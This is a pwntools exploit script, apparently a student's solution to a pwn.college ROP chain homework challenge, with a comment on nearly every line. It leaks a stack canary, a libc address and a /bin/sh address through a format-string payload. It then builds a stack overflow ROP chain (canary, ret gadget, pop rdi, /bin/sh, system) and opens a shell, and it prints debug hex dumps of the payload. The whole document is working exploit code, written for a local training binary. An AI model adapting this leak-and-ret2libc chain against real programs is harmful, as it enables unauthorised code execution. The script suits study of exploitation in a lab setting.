# Username: vasanth.vanan (pwn.college dojos)
# Title: Homework challenge for ROP Chain Homework 

# imported the 'pwntools' library
from pwn import *

# assigned the context for the binary analysis to get the context of the binary. 
context.binary = elf = ELF("./homework", checksec = False)

#context.log_level = "DEBUG"

# created a local process with the path of the binary.
p = process([elf.path])

# received a line until given text from the process.
p.recvuntil(b'name!\n')

# framed payload for positional index: stack canary, dynamic libc and /bin/sh address.
# identified from debugging the GDB.
payload = b"%19$p%25$p%57$p"

# sent the payload to the first buffer[16].
p.sendline(payload)

# received the output from the process.
p.readline()

# received the leaked address for the respective indexes from the process.
addresses = (p.readline().replace(b'\n',b'').split(b'0x'))

# stored the addresses in respective variables in 16 bit addresses.
canary = int(b"0x"+addresses[1], 16)
dynamic_libc = int(b"0x"+addresses[2], 16)
binsh = int(b"0x"+addresses[3], 16)

# printed the leaked addresses to check if they are correct.
log.info('Dynamic libc address: {}'.format(hex(dynamic_libc)))
log.info('Canary address: {}'.format(hex(canary)))
log.info('/bin/sh address: {}'.format(hex(binsh)))

# [*] Dynamic libc address: 0x7eff25138083
# [*] Canary address: 0x5cd9d5e4ae2c3900
# [*] /bin/sh address: 0x7ffc7f0ea5d9

# calculated the system offset from GDB. added the same to the dynamic libc address to get the system address.
system = dynamic_libc + 0x2e20d
log.info("system address: {}".format(hex(system)))

# [*] system address: 0x7eff25166290

#gdb.attach(p)

# read the line after the prompt.
p.readline()

# Identified pop-rdi address from ROPGadget. 
POP_RDI = 0x4013f3 
 
# constructed the payload with following content: 
# buffer size of 72 bytes followed by leaked dynamic canary value followed by 8 bytes of 
# padding followed by the pop-rdi address followed by the /bin/sh address and system address.
# Note: binsh would provide result: 'SHELL=/bin/sh' in the environment variables. so, we need to pass 6 bytes to get the shell.
payload = b'A' * 72 + p64(canary) + b'A' * 8 + p64(0x00000000004011af)
payload += p64(POP_RDI)
payload += p64(binsh+6)
payload += p64(system)

# sent the payload to the process.
p.sendline(payload)

# [DEBUG] Sent 0x79 bytes:
#     00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
#     *
#     00000040  41 41 41 41  41 41 41 41  00 39 2c ae  e4 d5 d9 5c  │AAAA│AAAA│·9,·│···\│
#     00000050  41 41 41 41  41 41 41 41  af 11 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
#     00000060  f3 13 40 00  00 00 00 00  df a5 0e 7f  fc 7f 00 00  │··@·│····│····│····│
#     00000070  90 62 16 25  ff 7e 00 00  0a                        │·b·%│·~··│·│
#     00000079

# get shell from the process.
p.interactive()